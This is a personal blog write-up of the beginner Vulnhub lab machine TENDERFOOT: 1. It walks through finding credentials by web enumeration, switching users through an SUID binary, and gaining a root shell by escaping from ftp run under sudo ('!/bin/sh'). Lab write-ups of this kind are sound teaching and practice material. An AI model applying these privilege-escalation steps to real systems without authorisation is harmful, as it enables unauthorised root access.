---
layout: post
title:  "Vulnhub - TENDERFOOT: 1"
date:   2020-10-26 19:00:00 +1100
category: hacking
---

## Introduction
*A very Easy Box for beginners, I recommend this box if you are new here. Your task is to grab all the 3 flags (user1.txt, user2.txt, proof.txt).*

This is [TENDERFOOT: 1](https://www.vulnhub.com/entry/tenderfoot-1,581/) from vulnhub. After banging my head on a few others, I thought I'd run through an easy box so I could feel like I actually have some idea what I'm doing :)

## Ports
This box has:

1. SSH on port 22, and
2. HTTP on port 80.

## HTTP
The frontpage of the website is the Apache default page, with a modification consisting of some hints about searching for hidden directories. The page source of /robots.txt points to a directory called */hint*. The index page there contains a base32 encoded comment in the page source exhorting us to try harder.

This is all about enumeration - I'll cut to the chase:

*/entry.js* contains our SSH username - **monica**  
*/fotocd/* contains some Brainfuck code that decodes to a message about SSH and a base64 encoded password - **$99990$**

## On the box
We're in as *monica*. Again, enumeration is required but ultimately we use an SUID binary that switches us to user *chandler*. No, literally that's what it does.

{% highlight shell %}
monica@TenderFoot:/opt/exec$ ls -lash
total 20K
4.0K drwxr-xr-x 2 root root 4.0K Oct  4 18:10 .
4.0K drwxr-xr-x 3 root root 4.0K Oct  4 18:03 ..
 12K -rwsr-xr-x 1 root root 8.6K Oct  4 18:09 chandler
monica@TenderFoot:/opt/exec$ ./chandler 
chandler@TenderFoot:/opt/exec$
{% endhighlight %}

Once we're *chandler* we can find another note with some base64 encoded text that translates to *passwd:Y0uCr4ckM3*. This is the SSH/sudo password for *chandler*. Interestingly we can't run *sudo -l* from our session that we got with the SUID binary, but we can *exit* then *su chandler* and then it works. Anyway *chandler* can run *ftp* as root:

{% highlight shell %}
chandler@TenderFoot:~$ sudo -u root /usr/bin/ftp
ftp> !/bin/sh
# cd /root
# ls
last_note.txt  proof.txt
# cat last_note.txt
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Well! congrats! for root this box, this is my first box very easy and basic.

I make this box for begginers, so that they have an basic idea what steps we have
to do to root box. 

Hope you like this box and learn something new. If you like please share your feedback.

See you in next box! and may be it will not that much EASY! :)

G00D LUCK!

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# cat proof.txt

ASCII Art removed


Congratulations! you found last flag of tenderfoot :)
{% endhighlight %}

So I'm at least at beginner level :)
